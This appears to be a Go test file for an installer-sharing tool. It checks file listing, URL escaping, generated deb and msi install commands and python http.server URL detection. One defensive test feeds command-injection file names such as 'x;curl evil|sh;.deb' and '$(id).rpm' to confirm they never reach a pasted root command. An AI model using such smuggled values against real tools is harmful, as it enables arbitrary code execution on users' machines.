package installers

import (
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

func writeFiles(t *testing.T, root string, files map[string]string) {
	t.Helper()
	for name, body := range files {
		p := filepath.Join(root, filepath.FromSlash(name))
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
}

func TestListShared(t *testing.T) {
	root := t.TempDir()
	writeFiles(t, root, map[string]string{
		"rc/fleetd-rc-linux-arm64-desktop.deb": "d",
		"rc/fleetd-rc-windows-arm64.msi":       "m",
		"rc/manifest.json":                     "{}",
		"rc/old/fleetd-rc-macos.pkg":           "too deep",
		".hidden/fleetd-x-linux-amd64.rpm":     "hidden",
		"loose file.pkg":                       "root-level",
		"prev/fleetd-prev-linux-amd64.rpm":     "r",
	})
	files, err := ListShared(root, "http://10.0.0.5:8000/")
	if err != nil {
		t.Fatal(err)
	}
	var paths []string
	for _, f := range files {
		paths = append(paths, f.Path)
	}
	want := "loose file.pkg,prev/fleetd-prev-linux-amd64.rpm,rc/fleetd-rc-linux-arm64-desktop.deb,rc/fleetd-rc-windows-arm64.msi"
	if strings.Join(paths, ",") != want {
		t.Fatalf("paths = %v", paths)
	}
	if files[0].URL != "http://10.0.0.5:8000/loose%20file.pkg" {
		t.Errorf("escaped URL = %q", files[0].URL)
	}
	deb := files[2]
	if deb.Shell != "sh" || deb.Command != `d=$(mktemp -d) && curl -fLo "$d/fleetd.deb" 'http://10.0.0.5:8000/rc/fleetd-rc-linux-arm64-desktop.deb' && sudo apt-get install -y "$d/fleetd.deb"` {
		t.Errorf("deb command = %q", deb.Command)
	}
	if msi := files[3]; msi.Shell != "powershell" || !strings.Contains(msi.Command, "msiexec.exe") || !strings.Contains(msi.Command, "'http://10.0.0.5:8000/rc/fleetd-rc-windows-arm64.msi'") {
		t.Errorf("msi command = %q", msi.Command)
	} else if !strings.HasPrefix(msi.Command, "$ErrorActionPreference = 'Stop';") || !strings.Contains(msi.Command, "NewGuid()") {
		// A failed download must stop before msiexec, which would otherwise
		// install whatever an earlier run left at a fixed path.
		t.Errorf("msi command doesn't stop on a failed download into a fresh file: %q", msi.Command)
	}
	// Not sharing: same files, no URLs or commands.
	bare, err := ListShared(root, "")
	if err != nil || len(bare) != len(files) || bare[2].URL != "" || bare[2].Command != "" || bare[2].Size == 0 {
		t.Errorf("unshared listing = %+v, %v", bare, err)
	}
	if missing, err := ListShared(filepath.Join(root, "nope"), "http://x/"); err != nil || len(missing) != 0 {
		t.Errorf("missing root: %v %v", missing, err)
	}
}

// A file name carrying shell or PowerShell syntax must not end up in a
// command someone pastes into a root shell.
func TestInstallCommandIgnoresHostileNames(t *testing.T) {
	for _, name := range []string{"x;curl evil|sh;.deb", "$(id).rpm", "a'b.pkg", "$(calc).msi"} {
		u := "http://10.0.0.5:8000/" + escapePath(name)
		cmd, _ := InstallCommand(name, u)
		if cmd == "" {
			t.Fatalf("%q: no command", name)
		}
		// Outside the URL the name doesn't appear at all; inside it, every
		// character a shell would interpret is percent-encoded.
		withoutURL := strings.Replace(cmd, u, "", 1)
		for _, bad := range []string{"evil", "$(id)", "a'b", "$(calc)"} {
			if strings.Contains(withoutURL, bad) {
				t.Errorf("%q: command carries %q: %s", name, bad, cmd)
			}
		}
		if strings.ContainsAny(strings.TrimPrefix(u, "http://10.0.0.5:8000/"), "'\";$`|() ") {
			t.Errorf("%q: URL has unescaped shell syntax: %s", name, u)
		}
	}
}

// The shell command really downloads the file and hands it to the installer.
func TestInstallCommandRuns(t *testing.T) {
	root := t.TempDir()
	writeFiles(t, root, map[string]string{
		"rc/fleetd-rc-linux-arm64.deb":         "deb-bytes",
		"rc/fleetd-rc-linux-arm64.pkg.tar.zst": "arch-bytes",
	})
	// Stands in for python http.server serving the folder.
	srv := httptest.NewServer(http.FileServer(http.Dir(root)))
	defer srv.Close()
	files, err := ListShared(root, srv.URL+"/")
	if err != nil || len(files) != 2 {
		t.Fatalf("files %v %v", files, err)
	}
	// Stub sudo: print the installer's last argument's contents.
	bin := t.TempDir()
	if err := os.WriteFile(filepath.Join(bin, "sudo"), []byte("#!/bin/sh\nfor a; do last=$a; done; cat \"$last\"\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	for _, f := range files {
		want := "deb-bytes"
		if strings.HasSuffix(f.Path, ".pkg.tar.zst") {
			want = "arch-bytes"
		}
		cmd := exec.Command("sh", "-c", f.Command)
		cmd.Env = append(os.Environ(), "PATH="+bin+":"+os.Getenv("PATH"))
		out, err := cmd.CombinedOutput()
		if err != nil || !strings.Contains(string(out), want) {
			t.Errorf("%s: command failed: %v\n%s", f.Path, err, out)
		}
	}
}

func TestPythonServedURL(t *testing.T) {
	const cmd = "python3 -m http.server 8000 --directory /Users/me/sharing"
	for _, c := range []struct {
		name, command, cwd, root, want string
	}{
		{"inside", cmd, "/repo", "/Users/me/sharing/packages", "http://10.0.0.5:8000/packages/"},
		{"the served folder itself", cmd, "/repo", "/Users/me/sharing", "http://10.0.0.5:8000/"},
		{"outside", cmd, "/repo", "/Users/me/other/packages", ""},
		// A sibling whose name starts the same isn't inside.
		{"sibling prefix", cmd, "/repo", "/Users/me/sharing2/packages", ""},
		{"relative dir", "python3 -m http.server 8000 --directory .", "/repo", "/repo/packages", "http://10.0.0.5:8000/packages/"},
		{"folder name escaped", cmd, "/repo", "/Users/me/sharing/my packages", "http://10.0.0.5:8000/my%20packages/"},
		{"not http.server", "python3 -m something", "/repo", "/Users/me/sharing/packages", ""},
	} {
		if got := PythonServedURL(c.command, c.cwd, c.root, "10.0.0.5"); got != c.want {
			t.Errorf("%s: PythonServedURL = %q, want %q", c.name, got, c.want)
		}
	}
}
